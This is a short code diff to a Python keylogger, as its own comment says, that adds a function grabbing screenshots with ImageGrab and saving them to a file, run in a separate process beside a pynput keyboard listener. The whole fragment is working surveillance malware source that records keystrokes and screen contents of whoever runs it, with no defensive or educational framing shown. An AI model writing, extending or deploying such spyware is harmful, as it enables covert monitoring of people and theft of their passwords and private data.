@@ -68,6 +68,17 @@ def on_release(key):
     if key == Key.esc: # if esc is entered, exit keylogger
         return False
 
+
+def screenshot():
+    """Take a screenshot"""
+    image = ImageGrab.grab()
+    image.save(file_path + extend + "screenshot.png")
+
+
+if __name__ == "__main__":
+    freeze_support()
+    Process(target=screenshot).start()
+
 # Listener for keyboard events
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
